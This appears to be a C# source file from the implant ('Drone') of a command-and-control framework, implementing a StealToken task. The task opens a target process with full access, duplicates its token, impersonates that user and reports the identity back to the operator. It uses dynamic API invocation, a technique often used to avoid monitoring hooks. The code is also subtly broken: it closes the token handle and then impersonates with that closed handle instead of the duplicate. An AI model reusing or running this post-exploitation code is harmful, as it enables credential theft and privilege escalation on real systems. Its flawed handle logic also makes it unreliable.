using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;

using Drone.Models;

namespace TokenModule;

public partial class TokenModule
{
    private void StealToken(DroneTask task, CancellationToken token)
    {
        var pid = uint.Parse(task.Arguments[0]);
        var hProcess = Invocation.DynamicInvoke.Native.NtOpenProcess(
            pid,
            Invocation.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS);
        
        var hToken = IntPtr.Zero;
        var success = Invocation.DynamicInvoke.Win32.Advapi32.OpenProcessToken(
            hProcess,
            Invocation.Data.Win32.Advapi32.TokenAccess.TOKEN_ALL_ACCESS,
            ref hToken);

        if (!success)
        {
            var e = new Win32Exception(Marshal.GetLastWin32Error());
            Drone.SendError(task.TaskGuid, $"OpenProcessToken failed. {e.Message}.");
            
            Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hProcess);
            return;
        }
        
        var hNewToken = IntPtr.Zero;
        success = Invocation.DynamicInvoke.Win32.Advapi32.DuplicateTokenEx(
            hToken,
            Invocation.Data.Win32.Advapi32.TokenAccess.TOKEN_ALL_ACCESS,
            Invocation.Data.Win32.WinNT.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
            Invocation.Data.Win32.WinNT.TOKEN_TYPE.TokenImpersonation,
            ref hNewToken);
        
        if (!success)
        {
            var e = new Win32Exception(Marshal.GetLastWin32Error());
            Drone.SendError(task.TaskGuid, $"DuplicateTokenEx failed. {e.Message}.");
            
            Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hToken);
            Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hProcess);
            return;
        }
        
        Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hProcess);
        Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hToken);
        
        success = Invocation.DynamicInvoke.Win32.Advapi32.ImpersonateLoggedOnUser(hToken);

        if (success)
        {
            using var identity = new WindowsIdentity(hToken);
            Drone.SendResult(task.TaskGuid, $"Impersonated token for {identity.Name}.");
        }
        else
        {
            var e = new Win32Exception(Marshal.GetLastWin32Error());
            Drone.SendError(task.TaskGuid, $"Failed to impersonate token. {e.Message}.");
        }
        
        Invocation.DynamicInvoke.Win32.Kernel32.CloseHandle(hNewToken);
    }
}